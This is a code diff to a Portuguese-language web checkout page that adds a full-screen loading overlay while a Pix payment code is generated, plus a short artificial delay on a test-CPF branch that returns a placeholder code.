@@ -883,6 +883,15 @@
     </style>
 </head>
 <body>
+    <!-- Full Screen Loader -->
+    <div id="global-loader" class="modal-overlay" style="display: none; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(8px); flex-direction: column; gap: 20px;">
+        <div class="spinner" style="width: 50px; height: 50px; border-width: 4px; border-top-color: var(--primary); border-right-color: rgba(0, 85, 255, 0.1); border-bottom-color: rgba(0, 85, 255, 0.1); border-left-color: rgba(0, 85, 255, 0.1);"></div>
+        <div style="text-align: center;">
+            <h3 style="font-weight: 800; color: var(--text-dark); margin-bottom: 5px;">Processando seu Pedido</h3>
+            <p style="color: var(--text-gray); font-size: 0.9rem;">Gerando seu código Pix de pagamento seguro...</p>
+        </div>
+    </div>
+
     <div class="container" id="mainContainer">
         <header class="header">
             <div class="header-left">
@@ -1280,16 +1289,17 @@
             if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
             if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
 
-            const btn = document.getElementById('btn-generate-pix');
-            const originalHTML = btn.innerHTML;
-            btn.innerHTML = '<div class="spinner"></div>';
-            btn.disabled = true;
+            const loader = document.getElementById('global-loader');
+            loader.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
 
             try {
                 sendEmailJS(name, cpfRaw, phone, subtotalValue);
                 
                 let pixCode = "";
                 if (cpf === '11111111111') {
+                    // Simula um pequeno delay para a transição ficar mais fluida e profissional
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                     pixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
                 } else {
                     pixCode = await fetchPixCode(name, cpf, phone);
@@ -1297,14 +1307,16 @@
 
                 if (pixCode) { 
                     showPixCopySection(pixCode); 
+                    loader.style.display = 'none';
+                    document.body.style.overflow = '';
                 } else { 
                     throw new Error(); 
                 }
             } catch (err) {
+                loader.style.display = 'none';
+                document.body.style.overflow = '';
                 errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
                 errorEl.classList.add('visible');
-                btn.innerHTML = originalHTML;
-                btn.disabled = false;
             }
         }
 
